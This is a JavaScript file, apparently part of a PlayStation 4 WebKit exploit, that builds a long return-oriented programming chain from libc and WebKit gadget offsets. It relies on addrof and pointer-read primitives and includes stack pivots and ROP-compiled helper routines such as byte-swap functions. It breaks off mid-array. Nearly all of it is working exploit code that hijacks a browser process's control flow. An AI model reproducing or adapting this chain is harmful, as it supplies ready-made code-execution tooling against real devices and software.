var ropchain_array = new Uint32Array(56160);
var ropchain = read_ptr_at(addrof(ropchain_array)+0x10);
var ropchain_offset = 2;
function set_gadget(val)
{
    ropchain_array[ropchain_offset++] = val | 0;
    ropchain_array[ropchain_offset++] = (val / 4294967296) | 0;
}
function set_gadgets(l)
{
    for(var i = 0; i < l.length; i++)
        set_gadget(l[i]);
}
function db(data)
{
    for(var i = 0; i < data.length; i++)
        ropchain_array[ropchain_offset++] = data[i];
}
var main_ret = malloc(8);
var printf_buf = malloc(65536);
var __swbuf_addr = 0; // STUB
set_gadgets([
libc_base+768796, //pop rax
ropchain+65720, //rdi_bak
webkit_base+14572727, //mov [rax], rdi
libc_base+165442, //pop rdi
ropchain+65680, //stack_bottom
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
ropchain+112, //ret_addr
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+192512, //_main
//ret_addr:
libc_base+489696, //pop rsp
ropchain+65680 //stack_bottom
]);
//_ps4_printf_buffer:
var printf_buf_offset = 128;
set_gadget(printf_buf);
//_ps4_printf_fd:
db([4294967295, 4294967295]); // -0x1
//stack:
ropchain_offset += 16384;
//stack_bottom:
set_gadgets([
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
main_ret,
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//rdi_bak:
//_pivot_back_addr:
db([0, 0]); // 0x0
set_gadgets([
pivot_addr,
//___builtin_bswap16:
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+65800, //L1
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L1:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+65912, //L3
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+65928, //L4
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L2:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L3:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L4:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+66032, //L7
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+66016, //L6
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L6:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L7:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229840, //mov ax, [rdi]
libc_base+713278, //pop rsi
ropchain+66192, //L12
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+66160, //L10
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+66176, //L11
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L9:
db([16, 0]); // 0x10
set_gadget(libc_base+165442,); //pop rdi
//L10:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L11:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L12:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+66248, //L13
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L13:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+66376, //L16
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+66392, //L17
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+66360, //L15
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L15:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L16:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L17:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+66552, //L21
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+66520, //L19
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+66536, //L20
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L18:
db([48, 0]); // 0x30
set_gadget(libc_base+165442,); //pop rdi
//L19:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L20:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L21:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+66656, //L23
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+66640, //L22
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L22:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L23:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L24:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L25:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+66864, //L28
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+66848, //L27
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L26:
db([48, 0]); // 0x30
set_gadget(webkit_base+3789839,); //pop r11
//L27:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L28:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+66968, //L30
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+66952, //L29
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L29:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L30:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+67064, //L32
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L31:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L32:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+67168, //L35
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+67152, //L34
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L34:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L35:
db([0, 0]); // 0x0
set_gadgets([
libc_base+229840, //mov ax, [rdi]
libc_base+713278, //pop rsi
ropchain+67328, //L40
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+67296, //L38
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+67312, //L39
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L37:
db([16, 0]); // 0x10
set_gadget(libc_base+165442,); //pop rdi
//L38:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L39:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L40:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+67384, //L41
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L41:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+67512, //L44
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+67528, //L45
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+67496, //L43
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L43:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L44:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L45:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+67688, //L49
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+67656, //L47
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+67672, //L48
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L46:
db([48, 0]); // 0x30
set_gadget(libc_base+165442,); //pop rdi
//L47:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L48:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L49:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+67792, //L51
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+67776, //L50
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L50:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L51:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L52:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L53:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+67992, //L56
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+67976, //L55
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L54:
db([32, 0]); // 0x20
set_gadget(webkit_base+3789839,); //pop r11
//L55:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L56:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+68096, //L58
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+68080, //L57
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L57:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L58:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+68208, //L61
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+68192, //L60
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L59:
db([48, 0]); // 0x30
set_gadget(webkit_base+3789839,); //pop r11
//L60:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L61:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+68272, //L62
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+772328 //pop rcx
]);
//L62:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+68328, //L64
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L64:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278, //pop rsi
ropchain+68464, //L66
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+68496, //L68
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+68480, //L67
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L66:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L67:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L68:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+68608, //L69
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+68640, //L71
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+68624, //L70
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L69:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L70:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L71:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+68744, //L72
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+68760, //L73
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L72:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L73:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+68880, //L74
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+68864, //L75
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L75:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L74:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+68968, //L77
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+68952, //L76
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L76:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L77:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+69072, //L78
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+69088, //L79
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L78:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L79:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+69208, //L80
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+69192, //L81
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L81:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L80:
db([0, 0]); // 0x0
//___builtin_bswap32:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+69280, //L83
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L83:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+69392, //L85
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+69408, //L86
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
//L84:
db([16, 0]); // 0x10
set_gadget(webkit_base+1420514,); //pop r8
//L85:
db([0, 0]); // 0x0
set_gadget(libc_base+772328,); //pop rcx
//L86:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+69512, //L89
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+69496, //L88
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L88:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L89:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+69672, //L92
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+69704, //L94
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+69656, //L91
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+69688, //L93
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L91:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L92:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L93:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L94:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+69800, //L96
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+69784, //L95
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L95:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L96:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L97:
db([24, 0]); // 0x18
set_gadget(libc_base+768796,); //pop rax
//L98:
db([24, 0]); // 0x18
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+70000, //L101
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+69984, //L100
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L99:
db([32, 0]); // 0x20
set_gadget(webkit_base+3789839,); //pop r11
//L100:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+70104, //L103
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+70088, //L102
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L102:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L103:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857183, //shr rax, cl
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+70208, //L105
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L104:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+70312, //L108
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+70296, //L107
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L107:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L108:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+70472, //L111
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+70504, //L113
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+70456, //L110
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+70488, //L112
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L110:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L111:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L112:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L113:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+70600, //L115
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+70584, //L114
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L114:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L115:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L116:
db([16711680, 0]); // 0xff0000
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+70712, //L118
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L118:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+5236215, //and rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L120:
db([8, 0]); // 0x8
set_gadget(libc_base+768796,); //pop rax
//L121:
db([8, 0]); // 0x8
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+70944, //L124
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+70928, //L123
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L122:
db([32, 0]); // 0x20
set_gadget(webkit_base+3789839,); //pop r11
//L123:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L124:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+71048, //L126
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+71032, //L125
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L125:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857183, //shr rax, cl
libc_base+713278, //pop rsi
ropchain+71104, //L127
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+71160, //L129
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L129:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+72932, //or rax, rcx
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+71288, //L132
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L131:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L132:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+71392, //L135
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+71376, //L134
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L134:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L135:
db([0, 0]); // 0x0
set_gadgets([
